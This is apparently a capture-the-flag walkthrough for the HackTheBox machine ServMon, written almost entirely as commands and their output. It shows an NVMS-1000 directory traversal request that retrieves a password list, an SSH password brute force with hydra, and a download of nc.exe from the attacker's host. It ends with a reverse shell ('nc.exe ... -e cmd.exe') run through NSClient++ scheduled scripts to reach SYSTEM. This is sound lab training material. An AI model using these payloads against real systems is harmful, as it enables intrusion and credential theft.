# servmon: https://app.hackthebox.com/machines/ServMon

```bash
nmap -sC -sV 10.10.10.184 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 19:55 BST
Nmap scan report for 10.10.10.184
Host is up (0.10s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c71af681ca1778d027dbcd462a092b54 (RSA)
|   256 3e63ef3b6e3e4a90f34c02e940672e42 (ECDSA)
|_  256 5a48c8cd39782129effbae821d03adaf (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
```
```bash
ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:joker): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49682|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users

ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49684|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
229 Entering Extended Passive Mode (|||49687|)
125 Data connection already open; Transfer starting.
```

```bash
cat Confidential.txt         
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine   
```

```bash
cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint            
```
```bash
searchsploit NVMS                        
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                | hardware/webapps/47774.txt
TVT NVMS 1000 - Directory Traversal                                            | hardware/webapps/48311.py

```

```bash
searchsploit -m hardware/webapps/47774.txt
  Exploit: NVMS 1000 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/47774
     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
```
```bash
#Request in Burp

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
If-Modified-Since: 0
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Content-Type: text/plain;charset=UTF-8
Content-Length: 103
Origin: http://10.10.10.184
Connection: close
Referer: http://10.10.10.184/Pages/login.htm
Cookie: dataPort=6063

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-1000" clientType="WEB"/>
```
```bash
#Response in Burp

HTTP/1.1 200 OK
Content-type: 
Content-Length: 92
Connection: close
AuthInfo: 

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

```bash
GET /../../../../../../../../../../..\Users\Nathan\Desktop\Passwords.txt HTTP/1.1

HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
```bash
cat passwords.txt    
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
```bash
cat users.txt 
Administrator
nadine
nathan
```

```bash
hydra  -L users.txt -P passwords.txt ssh://10.10.10.184

[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found

```

```bash
ssh nadine@10.10.10.184
nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.
nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```
```bash
nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
b7357bc463d0ad407c9a8ab1fea28122     
```

```bash
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 

; Undocumented key
password = ew2x6SsGTxjRwXOT
; Undocumented key
allowed hosts = 127.0.0.1
```
```bash
nadine@SERVMON C:\Program Files\NSClient++>.\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```
```bash
sshpass -p L1k3B1gBut7s@W0rk ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443

#visit the url below
https://127.0.0.1:8443/index.html#/

password:ew2x6SsGTxjRwXOT
```
```bash
searchsploit nsclient                               
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                       | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                      | windows/local/46802.txt
-------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -x json/webapps/48360.txt

Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

.
.Snipped
.

```
```bash
#visit the url: https://127.0.0.1:8443/index.html#/settings/settings/external%20scripts/scripts

Key: revshell
Value: c:\temp\rev.bat
Add
Changes>Always Save
Changes>Change Configuration
Control>Reload

#visit the url: https://127.0.0.1:8443/index.html#/settings/settings/scheduler
Key: muckk
Value: muck
Add
Changes>Always Save
Changes>Change Configuration
Control>Reload
```

```bash
cp /usr/share/windows-resources/binaries/nc.exe .  
python -m http.server 9998                                  
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...

nadine@SERVMON curl 10.10.16.2:9998/nc.exe -o C:\temp\nc.exe
```

```bash
echo c:\temp\nc.exe 10.10.16.2 7070 -e cmd.exe > rev.bat

#Visit the url and "Run"
#https://127.0.0.1:8443/index.html#/queries/muck

nc -lvnp 7070                                         
listening on [any] 7070 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.184] 51216
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
1ca6b871d79ddd7d56956b47698ad82d
```
